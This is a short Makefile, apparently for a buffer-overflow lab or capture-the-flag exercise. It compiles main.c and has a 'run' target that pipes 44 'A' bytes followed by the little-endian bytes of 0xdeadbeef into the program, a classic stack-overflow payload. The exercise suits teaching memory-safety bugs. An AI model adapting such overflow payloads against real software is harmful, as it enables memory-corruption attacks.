build: main.c
	gcc main.c -o main

run: build
	python -c "print 'A'*44+'\xef\xbe\xad\xde'" | ./main

clean:
	rm -f main
.PHONY: run build clean

